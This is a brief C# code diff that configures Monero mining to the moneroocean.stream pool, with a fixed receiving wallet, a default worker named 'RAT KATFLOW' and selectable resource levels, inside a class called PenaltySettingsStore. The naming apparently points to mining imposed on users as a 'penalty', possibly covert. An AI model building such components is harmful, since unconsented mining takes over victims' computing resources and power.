@@ -41,7 +41,7 @@ public sealed class PenaltySettingsStore
         {
             PoolHost = "moneroocean.stream",
             PoolPort = 10001,
-            WalletAddress = ReceivingAddress,
+            WalletAddress = PenaltySettings.ReceivingAddress,
             WorkerName = string.IsNullOrWhiteSpace(settings.WorkerName) ? "RAT KATFLOW" : settings.WorkerName.Trim(),
             ResourceMode = settings.ResourceMode is "Easy" or "Medium" or "Hard" or "Beta" ? settings.ResourceMode : "Medium"
         };
